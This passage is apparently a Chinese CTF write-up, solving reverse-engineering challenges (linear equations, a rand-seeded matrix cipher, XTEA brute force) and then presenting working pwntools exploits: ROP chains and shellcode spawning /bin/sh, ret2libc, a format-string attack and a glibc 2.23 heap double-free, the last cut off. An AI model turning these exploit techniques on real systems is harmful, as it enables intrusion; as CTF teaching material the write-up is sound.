A[17, 0] = 24; A[17, 1] = 0; A[17, 2] = -1; A[17, 3] = -15; A[17, 4] = 13; A[17, 5] = 4; A[17, 6] = 16; A[17, 7] = 67; A[17, 8] = 146; A[17, 9] = -50; A[17, 10] = 16; A[17, 11] = 6; A[17, 12] = -1; A[17, 13] = 69; A[17, 14] = -27; A[17, 15] = 45; A[17, 16] = -6; A[17, 17] = 17
b[17] = 18257
A[18, 0] = 25; A[18, 1] = 26; A[18, 2] = -89; A[18, 3] = 16; A[18, 4] = 19; A[18, 5] = 44; A[18, 6] = 36; A[18, 7] = 66; A[18, 8] = -150; A[18, 9] = -250; A[18, 10] = 166; A[18, 11] = 126; A[18, 12] = -11; A[18, 13] = 690; A[18, 14] = -207; A[18, 15] = 46; A[18, 16] = 6; A[18, 17] = 7; A[18, 18] = -18
b[18] = 12591
A[19, 0] = 5; A[19, 1] = 26; A[19, 2] = 8; A[19, 3] = 160; A[19, 4] = 9; A[19, 5] = -4; A[19, 6] = 36; A[19, 7] = 6; A[19, 8] = -15; A[19, 9] = -20; A[19, 10] = 66; A[19, 11] = 16; A[19, 12] = -1; A[19, 13] = 690; A[19, 14] = -20; A[19, 15] = 46; A[19, 16] = 6; A[19, 17] = 7; A[19, 18] = -18; A[19, 19] = 19
b[19] = 52041
A[20, 0] = 29; A[20, 1] = -26; A[20, 2] = 0; A[20, 3] = 60; A[20, 4] = 90; A[20, 5] = -4; A[20, 6] = 6; A[20, 7] = 6; A[20, 8] = -16; A[20, 9] = -21; A[20, 10] = 69; A[20, 11] = 6; A[20, 12] = -12; A[20, 13] = 69; A[20, 14] = -20; A[20, 15] = -46; A[20, 16] = 65; A[20, 17] = 0; A[20, 18] = -1; A[20, 19] = 39; A[20, 20] = -20
b[20] = 20253
A[21, 0] = 45; A[21, 1] = -56; A[21, 2] = 10; A[21, 3] = 650; A[21, 4] = -900; A[21, 5] = 44; A[21, 6] = 66; A[21, 7] = -6; A[21, 8] = -6; A[21, 9] = -21; A[21, 10] = 9; A[21, 11] = -6; A[21, 12] = -12; A[21, 13] = 69; A[21, 14] = -2; A[21, 15] = -406; A[21, 16] = 651; A[21, 17] = 2; A[21, 18] = -10; A[21, 19] = 69; A[21, 20] = 0; A[21, 21] = 21
b[21] = 18768
A[22, 0] = 555; A[22, 1] = -6666; A[22, 2] = 70; A[22, 3] = 510; A[22, 4] = -90; A[22, 5] = 499; A[22, 6] = 66; A[22, 7] = -66; A[22, 8] = -610; A[22, 9] = -221; A[22, 10] = 9; A[22, 11] = -23; A[22, 12] = -102; A[22, 13] = 6; A[22, 14] = 2050; A[22, 15] = -406; A[22, 16] = 665; A[22, 17] = 333; A[22, 18] = 100; A[22, 19] = 609; A[22, 20] = 777; A[22, 21] = 201; A[22, 22] = -22
b[22] = 111844
A[23, 0] = 1; A[23, 1] = -22; A[23, 2] = 333; A[23, 3] = 4444; A[23, 4] = -5555; A[23, 5] = 6666; A[23, 6] = -666; A[23, 7] = 676; A[23, 8] = -660; A[23, 9] = -22; A[23, 10] = 9; A[23, 11] = -73; A[23, 12] = -107; A[23, 13] = 6; A[23, 14] = 250; A[23, 15] = -6; A[23, 16] = 65; A[23, 17] = 39; A[23, 18] = 10; A[23, 19] = 69; A[23, 20] = 777; A[23, 21] = 201; A[23, 22] = -2; A[23, 23] = 23
b[23] = 159029
A[24, 0] = 520; A[24, 1] = -222; A[24, 2] = 333; A[24, 3] = 4; A[24, 4] = -56655; A[24, 5] = 6666; A[24, 6] = 666; A[24, 7] = 66; A[24, 8] = -60; A[24, 9] = -220; A[24, 10] = 99; A[24, 11] = 73; A[24, 12] = 1007; A[24, 13] = 7777; A[24, 14] = 2500; A[24, 15] = 6666; A[24, 16] = 605; A[24, 17] = 390; A[24, 18] = 100; A[24, 19] = 609; A[24, 20] = 99999; A[24, 21] = 210; A[24, 22] = 232; A[24, 23] = 23; A[24, 24] = -24
b[24] = 2762025
A[25, 0] = 1323; A[25, 1] = -22; A[25, 2] = 333; A[25, 3] = 4; A[25, 4] = -55; A[25, 5] = 666; A[25, 6] = 666; A[25, 7] = 66; A[25, 8] = -660; A[25, 9] = -220; A[25, 10] = 99; A[25, 11] = 3; A[25, 12] = 100; A[25, 13] = 777; A[25, 14] = 2500; A[25, 15] = 6666; A[25, 16] = 605; A[25, 17] = 390; A[25, 18] = 100; A[25, 19] = 609; A[25, 20] = 9999; A[25, 21] = 210; A[25, 22] = 232; A[25, 23] = 23; A[25, 24] = -24; A[25, 25] = 25
b[25] = 1551621
A[26, 0] = 777; A[26, 1] = -22; A[26, 2] = 6969; A[26, 3] = 4; A[26, 4] = -55; A[26, 5] = 666; A[26, 6] = -6; A[26, 7] = 96; A[26, 8] = -60; A[26, 9] = -220; A[26, 10] = 99; A[26, 11] = 3; A[26, 12] = 100; A[26, 13] = 777; A[26, 14] = 250; A[26, 15] = 666; A[26, 16] = 65; A[26, 17] = 90; A[26, 18] = 100; A[26, 19] = 609; A[26, 20] = 999; A[26, 21] = 21; A[26, 22] = 232; A[26, 23] = 23; A[26, 24] = -24; A[26, 25] = 25; A[26, 26] = -26
b[26] = 948348
A[27, 0] = 97; A[27, 1] = -22; A[27, 2] = 6969; A[27, 3] = 4; A[27, 4] = -56; A[27, 5] = 96; A[27, 6] = -6; A[27, 7] = 96; A[27, 8] = -60; A[27, 9] = -20; A[27, 10] = 99; A[27, 11] = 3; A[27, 12] = 10; A[27, 13] = 707; A[27, 14] = 250; A[27, 15] = 666; A[27, 16] = -9; A[27, 17] = 90; A[27, 18] = -2; A[27, 19] = 609; A[27, 20] = 0; A[27, 21] = 21; A[27, 22] = 2; A[27, 23] = 23; A[27, 24] = -24; A[27, 25] = 25; A[27, 26] = -26; A[27, 27] = 27
b[27] = 777044
A[28, 0] = 177; A[28, 1] = -22; A[28, 2] = 699; A[28, 3] = 64; A[28, 4] = -56; A[28, 5] = -96; A[28, 6] = -66; A[28, 7] = 96; A[28, 8] = -60; A[28, 9] = -20; A[28, 10] = 99; A[28, 11] = 3; A[28, 12] = 10; A[28, 13] = 707; A[28, 14] = 250; A[28, 15] = 666; A[28, 16] = -9; A[28, 17] = 0; A[28, 18] = -2; A[28, 19] = 69; A[28, 20] = 0; A[28, 21] = 21; A[28, 22] = 222; A[28, 23] = 23; A[28, 24] = -224; A[28, 25] = 25; A[28, 26] = -26; A[28, 27] = 27; A[28, 28] = -28
b[28] = 185016
A[29, 0] = 77; A[29, 1] = -2; A[29, 2] = 6; A[29, 3] = 6; A[29, 4] = -96; A[29, 5] = -9; A[29, 6] = -6; A[29, 7] = 96; A[29, 8] = 0; A[29, 9] = -20; A[29, 10] = 99; A[29, 11] = 3; A[29, 12] = 10; A[29, 13] = 707; A[29, 14] = 250; A[29, 15] = 666; A[29, 16] = -9; A[29, 17] = 0; A[29, 18] = -2; A[29, 19] = 9; A[29, 20] = 0; A[29, 21] = 21; A[29, 22] = 222; A[29, 23] = 23; A[29, 24] = -224; A[29, 25] = 26; A[29, 26] = 58; A[29, 27] = 27; A[29, 28] = -2; A[29, 29] = 29
b[29] = 130106
sol = np.linalg.solve(A, b)
chars = [chr(int(round(v))) for v in sol]
flag_string = "".join(chars)
print("Recovered unique-string (iiIII):")
print(flag_string)
```

结果

```python
Recovered unique-string (iiIII): 
H1Z1N1U1C1T1F1{1a6d275f7-463}1
```

这里的`H1 Z1 N1 U1 C1 T1 F1 {1 a6 d2 75 f7 -4 63 }1`是对应字符和它的出现次数

对应原结果：`625764536547736477764575236` 建表进行解码：

```plain
str = "625764536547736477764575236"
l = ['?', '?', 'd', '6', '-', '7', 'a', 'f']
for i in str:
    print(l[int(i)], end='')
```

结果套上格式就是 flag 了

### randomsystem
IDA 查看：

```python
__int64 sub_412370()
{
  int v0; // edx
  int v1; // eax
  __int64 v3; // [esp-8h] [ebp-78Ch]
  char v4; // [esp+0h] [ebp-784h]
  char v5; // [esp+0h] [ebp-784h]
  char v6; // [esp+0h] [ebp-784h]
  char v7; // [esp+0h] [ebp-784h]
  char v8; // [esp+0h] [ebp-784h]
  int m; // [esp+250h] [ebp-534h]
  int k; // [esp+25Ch] [ebp-528h]
  unsigned int v11; // [esp+268h] [ebp-51Ch]
  int j; // [esp+274h] [ebp-510h]
  char v13; // [esp+283h] [ebp-501h]
  int i; // [esp+298h] [ebp-4ECh]
  _DWORD v15[34]; // [esp+2A4h] [ebp-4E0h] BYREF
  char Str[20]; // [esp+32Ch] [ebp-458h] BYREF
  _DWORD v17[66]; // [esp+340h] [ebp-444h] BYREF
  _OWORD v18[16]; // [esp+448h] [ebp-33Ch] BYREF
  char v19[264]; // [esp+550h] [ebp-234h] BYREF
  char Destination[96]; // [esp+658h] [ebp-12Ch] BYREF
  char v21; // [esp+6B8h] [ebp-CCh] BYREF
  char Source[76]; // [esp+6C0h] [ebp-C4h] BYREF
  int v23; // [esp+70Ch] [ebp-78h] BYREF
  int v24; // [esp+710h] [ebp-74h]
  int v25; // [esp+714h] [ebp-70h]
  int v26; // [esp+718h] [ebp-6Ch]
  char v27; // [esp+71Ch] [ebp-68h]
  _DWORD v28[4]; // [esp+728h] [ebp-5Ch] BYREF
  char v29[72]; // [esp+738h] [ebp-4Ch] BYREF
  int savedregs; // [esp+784h] [ebp+0h] BYREF

  sub_41137A(&unk_41E0A9);
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  j_memset(v19, 0, 0x100u);
  j_memset(v18, 0, sizeof(v18));
  strcpy(Str, "KeYkEy!!");
  v17[0] = 376;
  v17[1] = 356;
  v17[2] = 169;
  v17[3] = 501;
  v17[4] = 277;
  v17[5] = 329;
  v17[6] = 139;
  v17[7] = 342;
  v17[8] = 380;
  v17[9] = 365;
  v17[10] = 162;
  v17[11] = 258;
  v17[12] = 381;
  v17[13] = 339;
  v17[14] = 347;
  v17[15] = 307;
  v17[16] = 263;
  v17[17] = 359;
  v17[18] = 162;
  v17[19] = 484;
  v17[20] = 310;
  v17[21] = 333;
  v17[22] = 346;
  v17[23] = 339;
  v17[24] = 150;
  v17[25] = 194;
  v17[26] = 175;
  v17[27] = 344;
  v17[28] = 158;
  v17[29] = 250;
  v17[30] = 128;
  v17[31] = 175;
  v17[32] = 158;
  v17[33] = 173;
  v17[34] = 152;
  v17[35] = 379;
  v17[36] = 158;
  v17[37] = 292;
  v17[38] = 130;
  v17[39] = 365;
  v17[40] = 197;
  v17[41] = 20;
  v17[42] = 197;
  v17[43] = 161;
  v17[44] = 198;
  v17[45] = 10;
  v17[46] = 207;
  v17[47] = 244;
  v17[48] = 202;
  v17[49] = 14;
  v17[50] = 204;
  v17[51] = 176;
  v17[52] = 193;
  v17[53] = 255;
  v17[54] = 35;
  v17[55] = 7;
  v17[56] = 158;
  v17[57] = 181;
  v17[58] = 145;
  v17[59] = 353;
  v17[60] = 153;
  v17[61] = 357;
  v17[62] = 246;
  v17[63] = 151;
  sub_4110EB("Welcome to HZNUCTF!!!\n", v4);
  sub_4110EB("Enter something: \n", v5);
  sub_411037("%64s", (char)v29);
  sub_411339(v29, v28);
  sub_41128F(v28[0], v28[1], &v23);
  if ( (char)v23 == 53
    && SBYTE1(v23) == 50
    && SBYTE2(v23) == 54
    && SHIBYTE(v23) == 53
    && (char)v24 == 53
    && SBYTE1(v24) == 54
    && SBYTE2(v24) == 54
    && SHIBYTE(v24) == 53
    && (char)v25 == 53
    && SBYTE1(v25) == 50
    && SBYTE2(v25) == 54
    && SHIBYTE(v25) == 53
    && (char)v26 == 53
    && SBYTE1(v26) == 51
    && SBYTE2(v26) == 54
    && SHIBYTE(v26) == 53 )
  {
    sub_4110EB("good_job!!!\n", v6);
    sub_4110EB("So, Plz input the flag:\n", v7);
    sub_411037("%73s", (char)&v21);
    strncpy_s(Destination, 0x41u, Source, 0x40u);
    sub_41127B();
    srand(Seed);
    sub_41127B();
    j_memset(v15, 0, 0x80u);
    for ( i = 0; i < 32; ++i )
    {
      do
      {
        rand();
        v1 = sub_41127B() % 32;
        v13 = 1;
        for ( j = 0; j < i; ++j )
        {
          if ( v15[j] == v1 )
          {
            v13 = 0;
            break;
          }
        }
      }
      while ( !v13 );
      v15[i] = v1;
    }
    sub_41105F(Destination, v15);
    sub_411307(v19, Destination);
    sub_411334(&v23, Str);
    sub_4112DA(&dword_41C368, v19, v18);
    v11 = 0;
    for ( k = 0; k < 8; ++k )
    {
      for ( m = 0; m < 8; ++m )
      {
        *((_DWORD *)&v18[2 * k] + m) ^= Str[v11 % j_strlen(Str)];
        ++v11;
      }
    }
    if ( sub_411078(v18, v17) == 1 )
      sub_4110EB("Congratulation!!!\n", v8);
  }
  else
  {
    sub_4110EB("wrong_wrong!!!\n", v6);
  }
  sub_41120D(&savedregs, &dword_412D48, 0, v0);
  return v3;
}
```

加密

用rand()对flag进行一次“加密”

设DAT_0041c368为矩阵A：

```python
[1, 1, 0, 1, 0, 0, 1, 0],
[0, 1, 1, 0, 0, 1, 0, 1],
[0, 0, 1, 1, 0, 1, 1, 0],
[0, 0, 0, 1, 0, 1, 0, 1],
[0, 1, 0, 0, 1, 0, 1, 0],
[0, 0, 0, 0, 0, 1, 0, 1],
[0, 0, 0, 0, 0, 0, 1, 1],
[0, 1, 1, 0, 0, 0, 0, 1],
```

然后将flag从左也到右整成个矩阵X

M = A * X

然后把M每行对ReVeReSe进行xor就变成了expected

反向求解即可

python 解密脚本：

```python
#!/usr/bin/env python3
import numpy as np
expected = [
    0x178, 0x164, 0xa9,  0x1f5, 0x115, 0x149, 0x8b,  0x156,
    0x17c, 0x16d, 0xa2,  0x102, 0x17d, 0x153, 0x15b, 0x133,
    0x107, 0x167, 0xa2,  0x1e4, 0x136, 0x14d, 0x15a, 0x153,
    0x96,  0xc2,  0xaf,  0x158, 0x9e,  0xfa,  0x80,  0xaf,
    0x9e,  0xad,  0x98,  0x17b, 0x9e,  0x124, 0x82,  0x16d,
    0xc5,  0x14,  0xc5,  0xa1,  0xc6,  10,    0xcf,  0xf4,
    0xca,  0xe,   0xcc,  0xb0,  0xc1,  0xff,  0x23,  7,
    0x9e,  0xb5,  0x91,  0x161, 0x99,  0x165, 0xf6,  0x97
]

key = [0x52, 0x65, 0x56, 0x65, 0x52, 0x65, 0x53, 0x65]
key_len = len(key)

M_flat = [ exp ^ key[i % key_len] for i, exp in enumerate(expected) ]
M = np.array(M_flat, dtype=np.int64).reshape((8, 8))

A = np.array([
    [1, 1, 0, 1, 0, 0, 1, 0],
    [0, 1, 1, 0, 0, 1, 0, 1],
    [0, 0, 1, 1, 0, 1, 1, 0],
    [0, 0, 0, 1, 0, 1, 0, 1],
    [0, 1, 0, 0, 1, 0, 1, 0],
    [0, 0, 0, 0, 0, 1, 0, 1],
    [0, 0, 0, 0, 0, 0, 1, 1],
    [0, 1, 1, 0, 0, 0, 0, 1]
], dtype=np.int64)

X = np.zeros((8, 8), dtype=np.int64)
for j in range(8):
    m = M[:, j].astype(np.float64)
    x = np.linalg.solve(A.astype(np.float64), m)
    x = np.rint(x).astype(np.int64)
    X[:, j] = x

permuted_flag_chars = [chr(x) for x in X.flatten()]
permuted_flag = "".join(permuted_flag_chars)

class MSVC_Rand:
    def __init__(self, seed):
        self.seed = seed & 0xffffffff

    def rand(self):
        self.seed = (self.seed * 214013 + 2531011) & 0xffffffff
        return (self.seed >> 16) & 0x7fff

lcg = MSVC_Rand(0x7e9)
P = []
while len(P) < 32:
    r = lcg.rand() & 0x1f
    if r not in P:
        P.append(r)

flag_list = list(permuted_flag)
flag_len = len(flag_list)
for i in range(flag_len // 2):
    if P[i] < flag_len:
        j = flag_len - P[i] - 1
        flag_list[i], flag_list[j] = flag_list[j], flag_list[i]

original_flag = "".join(flag_list)
print("HZNUCTF{" + original_flag + "}")
```

### XTEA
IDA 查看

```python
__int64 sub_140011BE0()
{
  char *v0; // rdi
  __int64 i; // rcx
  __int64 v2; // rax
  __int64 v3; // rdi
  char v5[32]; // [rsp+0h] [rbp-20h] BYREF
  char v6; // [rsp+20h] [rbp+0h] BYREF
  unsigned int v7; // [rsp+24h] [rbp+4h] BYREF
  void *Block; // [rsp+48h] [rbp+28h]
  void *v9; // [rsp+68h] [rbp+48h]
  _DWORD v10[15]; // [rsp+88h] [rbp+68h] BYREF
  int j; // [rsp+C4h] [rbp+A4h]
  int k; // [rsp+E4h] [rbp+C4h]
  int m; // [rsp+104h] [rbp+E4h]
  int v14; // [rsp+1D4h] [rbp+1B4h]

  v0 = &v6;
  for ( i = 66LL; i; --i )
  {
    *(_DWORD *)v0 = -858993460;
    v0 += 4;
  }
  sub_1400113A2(&unk_1400220A7);
  srand(0x7E8u);
  sub_140011181();
  sub_1400111A9("Welcome to HZNUCTF!!!\n");
  sub_1400111A9("Plz input the cipher:\n");
  v7 = 0;
  if ( (unsigned int)sub_140011217("%d", (unsigned int)&v7) == 1 )
  {
    sub_1400111A9("Plz input the flag:\n");
    Block = malloc(0x21uLL);
    v9 = malloc(0x10uLL);
    if ( (unsigned int)sub_140011217("%s", (const char *)Block) == 1 )
    {
      for ( j = 0; j < 32; j += 4 )
      {
        v14 = *((char *)Block + j + 3) | (*((char *)Block + j + 2) << 8) | (*((char *)Block + j + 1) << 16) | (*((char *)Block + j) << 24);
        v10[j / 4] = v14;
      }
      sub_1400110B9(v9);
      for ( k = 0; k < 7; ++k )
        sub_140011212(v7, &v10[k], &v10[k + 1], v9);
      for ( m = 0; m < 8; ++m )
      {
        if ( v10[m] != dword_14001D000[m] )
        {
          sub_1400111A9("wrong_wrong!!!");
          exit(1);
        }
      }
      sub_1400111A9("Congratulation!!!");
      free(Block);
      free(v9);
      v2 = 0LL;
    }
    else
    {
      sub_1400111A9("Invalid input.\n");
      free(Block);
      free(v9);
      v2 = 1LL;
    }
  }
  else
  {
    sub_1400111A9("Invalid input.\n");
    v2 = 1LL;
  }
  v3 = v2;
  sub_14001133E(v5, &unk_14001AD40);
  return v3;
}
```

![](/images/b9936c480c8dddedd20f53e9c1f07319.png)![](/images/eb26f150a18d95ca68818e4590e2f7cf.png)

rand()生成 key

换表 TEA，XTEA

没给 cipher，要爆破，exp 跑一会

exp：

```python
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>

int main() {
    uint32_t key[4];
    generate_key(key);
    printf("[*] Generated key: %08x %08x %08x %08x\n", key[0], key[1], key[2], key[3]);

    uint32_t decrypted[8];
    char flag[33];

    for (uint32_t cipher = 0x0; cipher < UINT32_MAX; cipher++) {
        if (!(cipher & 0xfffff)) {
            printf("%u, %.3lf%%    \r", cipher, (double) cipher / (double) UINT32_MAX);
            fflush(stdout);
        }
        
        decrypt_state(cipher, TARGET, key, decrypted);
        words_to_string(decrypted, flag);

        if (strstr(flag, "HZNUCTF") != NULL) {
            printf("[+] Found candidate flag!\n");
            printf("Cipher=0x%x\n", cipher);
            printf("Flag=%s\n", flag);
            return 0;
        }
    }

    printf("[-] No valid flag found in tested cipher range.\n");
    return 1;
}

uint32_t TARGET[8] = {0x8CCB2324,0x9A7741A,0x0FB3C678D,0x0F6083A79,0x0F1CC241B,0x39FA59F2,0x0F2ABE1CC,0x17189F72,0x28};

uint32_t msvc_seed;
void msvc_srand(uint32_t seed) {
    msvc_seed = seed;
}

uint32_t msvc_rand() {
    msvc_seed = (msvc_seed * 214013u + 2531011u);
    return (msvc_seed >> 16) & 0x7FFF;
}

void generate_key(uint32_t key[4]) {
    msvc_srand(0x7e8);
    for (int i = 0; i < 4; i++) {
        key[i] = msvc_rand();
    }
}

void words_to_string(uint32_t words[8], char out[32 + 1]) {
    for (int i = 0; i < 8; i++) {
        out[i * 4 + 0] = (words[i] >> 24) & 0xFF;
        out[i * 4 + 1] = (words[i] >> 16) & 0xFF;
        out[i * 4 + 2] = (words[i] >> 8) & 0xFF;
        out[i * 4 + 3] = (words[i] >> 0) & 0xFF;
    }
    out[32] = '\0';
}

void decrypt_pair(uint32_t cipher, uint32_t *v0, uint32_t *v1, uint32_t key[4]) {
    uint32_t sum = (uint32_t)(-32 * cipher);
    for (int i = 0; i < 32; i++) {
        *v1 -= (((*v0 * 16) ^ (*v0 >> 5)) + *v0) ^ (sum + key[(sum >> 11) & 3]);
        sum += cipher;
        *v0 -= (((*v1 << 4) ^ (*v1 >> 5)) + *v1) ^ (sum + key[sum & 3]);
    }
}

void decrypt_state(uint32_t cipher, uint32_t state[8], uint32_t key[4], uint32_t output[8]) {
    memcpy(output, state, sizeof(uint32_t) * 8);
    for (int round = 6; round >= 0; round--) {
        decrypt_pair(cipher, &output[round], &output[round + 1], key);
    }
}
```

![](/images/a920707887b20598064aec34b363c29a.png)

## PWN
### overflow
没有 canary，直接栈溢出

但是在返回前会有一些不太一样，得注意一下，没法跟正常直接接着返回地址 ROP 

![](/images/72d28e9517e37dd4a0d43a079f6f2694.png)

由于是动调看的执行流，所以具体过程就不说了

不过 ROP 链因为这个题目是静态编译的是，所以可以 ROPgadget 一把梭，这就很爽了

`ROPgadget --binary ./overflow --ropchain` 一把梭

总结就是，第一遍输入 ROP 一把梭，第二次输入覆盖返回地址到写好的 ROP 链上

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

# link=process("./overflow")
link=remote("node2.tgctf.woooo.tech",30922)

# gdb.attach(link,'b *0x80498C9')
# pause()

p1 = b'a'*0xc8+p32(0x80EF324)

p = p32(0x08060bd1) # pop edx ; ret
p += p32(0x080ee060) # @ .data
p += p32(0x080b470a) # pop eax ; ret
p += b'/bin'
p += p32(0x080597c2) # mov dword ptr [edx], eax ; ret
p += p32(0x08060bd1) # pop edx ; ret
p += p32(0x080ee064) # @ .data + 4
p += p32(0x080b470a) # pop eax ; ret
p += b'//sh'
p += p32(0x080597c2) # mov dword ptr [edx], eax ; ret
p += p32(0x08060bd1) # pop edx ; ret
p += p32(0x080ee068) # @ .data + 8
p += p32(0x080507e0) # xor eax, eax ; ret
p += p32(0x080597c2) # mov dword ptr [edx], eax ; ret
p += p32(0x08049022) # pop ebx ; ret
p += p32(0x080ee060) # @ .data
p += p32(0x08049802) # pop ecx ; ret
p += p32(0x080ee068) # @ .data + 8
p += p32(0x08060bd1) # pop edx ; ret
p += p32(0x080ee068) # @ .data + 8
p += p32(0x080507e0) # xor eax, eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08082bbe) # inc eax ; ret
p += p32(0x08049c6a) # int 0x80

link.recvuntil(b'me your name?')
link.sendline(p)
link.recvuntil(b'gets,right?')
link.sendline(p1)

link.interactive()
```

### shellcode
限制 0x12 字节的 shellcode，只有一次输入

除了 rdi，其他寄存器都清空了

可以利用 add 让 rdi 指向 payload 的`/bin/sh`

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
# link=process("./shellcode")
link=remote("node2.tgctf.woooo.tech",32558)
# libc=ELF('./glibc/2.23-0ubuntu11.3_amd64/libc-2.23.so')
# elf=ELF('./heap')

# gdb.attach(link,'b *$rebase(0x1212)')
# pause()

payload=asm('''
    add rax,0x3b
    add rdi,0xa
    syscall
''')+b'/bin/sh\x00'
print(len(payload))
link.sendline(payload)

link.interactive()
```

### stack
![](/images/4795185947bf916b5d9cd3c629e3e554.png)

没有canary、PIE，got表可写

第一个read是写在data段上的，有溢出可以覆盖到下面

![](/images/ea6fb085a820923b68f3749e900b5537.png)

正好可以覆盖到'/bin/sh'之前，前面这几个都可以篡改

诶，前面这个qword_4040a0正好是存系统调用号的地方，而fd、count和buf是系统调用放参数的地方

这下清晰可见了，先用第一个read 覆盖到qword_4040a0、fd、count和buf，分别是 59（execve 的系统调用号）、0x404108（/bin/sh 的地址）、0、0

然后直接跳转到这个 gadget

![](/images/0cbb2c3d04705db28e46ec51180605e0.png)

就可以 getshell 了

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
# link=process("./stack")
link=remote("node1.tgctf.woooo.tech",31488)

binsh=0x404108
ret=0x40101a

sysnum=59 #execve
link.recvuntil(b'could you tell me your name?\n')
link.send(b'a'*0x40+p64(sysnum)+p64(binsh)+b'\x00'*0x58)

link.recvuntil(b'what dou you want to say?\n')
payload=b'a'*0x48+p64(0x4011C9)
link.send(payload)

link.interactive()
```

### 签到
简单的 ret2libc，只是要注意控制 rbp、rsp 的值

exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote("node2.tgctf.woooo.tech",31876)
# link=process('./qiandao')
elf=ELF("./qiandao")
libc=ELF("./libc.so.6")

puts=elf.plt['puts']

rdi=0x401176
bss=0x404868

# gdb.attach(link,'b *0x4011E0')
# pause()

payload=b'a'*0x70+p64(bss)+p64(rdi)+p64(elf.got['puts'])+p64(puts)+p64(0x4011C0)
link.recvuntil(b'please leave your name.')
link.sendline(payload)

puts_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))


libc_base=puts_addr-libc.symbols['puts']
print(hex(libc_base))

# ogg=[0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
# one_gadget=libc_base+ogg[6]

binsh=libc_base+0x1d8678
system=libc_base+libc.symbols['system']

link.recvuntil(b'please leave your name.')
link.sendline(b'a'*0x70+p64(bss)+p64(rdi)+p64(binsh)+p64(system))

link.interactive()
```

### fmt
![](/images/25bf33eea69dedabf47d2a4e1eedca13.png)

![](/images/332f45a7d7b6627f61391ea004e2ef0b.png)

参考文章：[https://www.cnblogs.com/S1nyer/p/17914751.html](https://www.cnblogs.com/S1nyer/p/17914751.html)

利用格式化字符串泄露 libc 地址，修改 printf 的返回地址然后跳到 gadget pop 几个寄存器跳过存在栈上的格式化字符串，接着执行 read，再用 read 往原来栈上接着调用 read 的地址往后写 ROP 链从而 getshell

核心出装：（？

```python
payload=b'%254c%10$hhn%19$paaaaaaa'+p64(read)+p64(printf_ret)
```

exp：

```python
#!/usr/bin/env python3

from pwn import *
context(arch = "amd64",os = "linux",log_level = "debug")
# link = process("./fmt")
link=remote("node1.tgctf.woooo.tech",30867)
libc = ELF("./libc.so.6")
rdi_ret = 0x401303

link.recvuntil(b"your gift ")
stack_addr=int(link.recvline()[:14],16)
success(hex(stack_addr))

# gdb.attach(link,"set solib-search-path /home/pwner/FocusingCTF/glibc/2.31-0ubuntu9.17_amd64/")
# pause()

read=0x40123D
printf_ret=stack_addr-0x8
link.recvuntil(b"name")
payload=b'%254c%10$hhn%19$paaaaaaa'+p64(read)+p64(printf_ret)
link.send(payload)

link.recvuntil(b"0x")
libc_base = int(link.recv(12), 16) - libc.symbols["__libc_start_main"] - 243
# print(hex(libc_base))
system=libc_base+0x51CD2
binsh=libc_base+next(libc.search(b'/bin/sh'))
# print(hex(binsh))

payload=b'a'*0x18+p64(rdi_ret)+p64(binsh)+p64(system)
link.send(payload)

link.interactive()
```

### heap
![](/images/305a4f36a4daacd9e2b4639ff556c900.png)

2.23的堆题

![](/images/2ddca61029a836938e740cb27be18a3a.png)

没有PIE

![](/images/e57fb571215dadd28cadec1b2a383107.png)

main函数稍微改了点符号方便看

在free之后没有把指针置零，限制申请chunk的大小最大是0x80，最多15个chunk

但是edit函数实际上edit的不是chunk而是在chunk的指针数组上面的bss段，给了0xd0的编辑长度

![](/images/6dac32330144a4ac3959522eabcaedf5.png)

![](/images/b1b933f847dc9e1a62e430f4eaae585f.png)

而且在编辑完之后还会打印出来

到这才看到原来main函数刚开头的名称也是写在这里的

但是edit不了chunk有什么用...只有在申请的时候才能写入一遍

题目也没有show，不知道怎么泄露libc地址

doublefree是可以的，但是没有libc地址，在got表也没法伪造chunk

查到资料：

![](/images/6768ed524aa0e2604fae9b5ebbe8ece2.png)

在name伪造连续三个chunk，后面两个用来绕过unsortedbin的检查，前面的用来利用编辑name功能来篡改size，从而让伪造的 chunk被free进unsortedbin

exp：

```python
from pwn import *
context.log_level = 'debug'

libc = ELF('./glibc/2.23-0ubuntu11.3_amd64/libc-2.23.so')
e = ELF('./heap')
# r = process('./pwn')
link = remote('node1.tgctf.woooo.tech',31705)

name_addr = 0x6020C0
ogg = [0x4527a, 0xf03a4, 0xf1247]

def add(size, content):
    link.sendlineafter(b'> ', b'1')
    link.sendlineafter(b'size?\n>', str(size).encode())
    link.sendafter(b'else?\n>', content)

def delete(idx):
    link.sendlineafter(b'> ', b'2')
    link.sendlineafter(b'delete?\n>', str(idx).encode())

def edit(name):
    link.sendlineafter(b'> ', b'3')
    link.recvuntil(b'change your name?\n>')
    link.send(name)

def exit():
    link.sendlineafter(b'> ', b'4')

link.recvuntil(b'What\'s your name?\n> ')
link.send(p64(0)+p64(0x61)+b'\x00'*0x80+p64(0)+p64(0x21)+p64(0)*3+p64(0x21))
add(0x50)  # 0
add(0x50)  # 1
delete(0)
delete(1)
delete(0)
add(0x50, p64(name_addr))  # 2 将name里面伪造的chunk放进fastbin里面
add(0x50)  # 3
add(0x50)  # 4
add(0x50, b'/bin/sh\x00')  # 5 申请出伪造的chunk
edit(p64(0)+p64(0x91))  # 修改伪造chunk的size，让free时可以进到unsortedbin里面
delete(5) # 把伪造chunk释放进unsortedbin
edit(b'c'*0x10)
link.recvuntil(b' see you '+b'c'*0x10)
